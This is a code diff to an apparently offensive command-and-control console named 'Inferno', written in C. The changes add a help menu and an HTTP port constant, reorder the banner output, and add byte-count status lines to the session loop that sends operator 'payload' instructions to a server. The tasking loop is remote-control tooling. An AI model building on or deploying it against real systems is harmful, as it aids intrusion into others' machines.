@@ -6,6 +6,7 @@
 #include <arpa/inet.h>
 #define IP "127.0.0.1"
 #define PORT 33333
+#define PORT_HTTP 80
 
 //print the banner
 void banner();
@@ -19,7 +20,13 @@ void networking(int inferno_socket);
 //session
 char *session_http(int inferno_socket);
 
+//help menu
+void help_menu();
+
 int main() {
+    banner();
+    info();
+
     //socket
     printf("\033[38;5;208m");
     printf("[>] ");
@@ -27,8 +34,6 @@ int main() {
     printf("Initializing socket...\n");
     int inferno_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 
-    banner();
-    info();
     networking(inferno_socket);
 }
 
@@ -91,7 +96,11 @@ void networking(int inferno_socket) {
         }
 
         instruction[strcspn(instruction, "\n")] = '\0';
-    
+
+        if (strcmp(instruction, "help") == 0) {
+            help_menu();
+        }        
+
         //exiting c2
         if (strcmp(instruction, "exit") == 0) {
             printf("\033[38;5;208m");
@@ -104,20 +113,14 @@ void networking(int inferno_socket) {
         //starting HTTP listener
         if (strcmp(instruction, "http") == 0) {
             printf("\033[38;5;208m");
-            printf("\n[>] ");
+            printf("[>] ");
             printf("\033[0m");            
             puts("Starting listener...");
             
             printf("\033[38;5;208m");
             printf("[>] ");
             printf("\033[0m");
-            puts("Listening");
-            
-            puts("==============================");
-            printf(" IP: %s                  \n", IP);
-            puts("==============================");
-            printf(" PORT: 80                \n");
-            puts("==============================\n");
+            printf("Listening on ADDRESS: %s\n\r\t\t    PORT: %d\n", IP, PORT_HTTP);
         }
 
         //entering session
@@ -166,12 +169,12 @@ char *session_http(int inferno_socket) {
     printf("\033[38;5;208m");
     printf("[>] ");
     printf("\033[0m");
-    printf("Sent: %s\n", status);
+    printf("Sent:\n%s\n", status);
 
     while (1) {
     	//crafting task
     	static char instruction_payload[1024];
-    	printf("\n[ASX]@[SESSION]> ");
+    	printf("[ASX]@[SESSION]> ");
 
     	if (fgets(instruction_payload, sizeof(instruction_payload), stdin) == NULL){
             perror("fgets failed");
@@ -210,6 +213,12 @@ char *session_http(int inferno_socket) {
             sprintf(request + strlen(request), "{'payload':'%s'}", instruction_payload);
         else
             sprintf(request + strlen(request), "{'payload':'%s','argument':'%s'}", instruction_payload, arg1);
+
+        //show payload infos
+        printf("\033[38;5;208m");
+        printf("[>] ");
+        printf("\033[0m");
+        printf("Sending %d bytes to server...\n", strlen(instruction_payload));
         
         //send payload to server
         printf("\033[38;5;208m");
@@ -224,12 +233,29 @@ char *session_http(int inferno_socket) {
         printf("[>] ");
         printf("\033[0m");
         printf("Waiting for response...\n");
-
+       
         //receiving payload result from server
         int inferno_receive = recv(inferno_socket, result, sizeof(result), 0);
+        
+        //infos result
         printf("\033[38;5;208m");
         printf("[>] ");
         printf("\033[0m");
-        printf("Result:\n%s\n", result); 
+        printf("Receiving %d bytes from server...\n", strlen(result));
+        
+        //result
+        printf("\033[38;5;208m");
+        printf("[>] ");
+        printf("\033[0m");
+        printf("Result:\n%s", result); 
     }
+}
+
+void help_menu() {
+    printf("\nCommand\tDescription\n");
+    printf("=======\t===========\n\n");
+    printf("exit\texit Inferno\n");
+    printf("help\tshow this menu\n");
+    printf("http\tstart an HTTP listener\n");
+    printf("enter\tenter in session\n\n");
 }
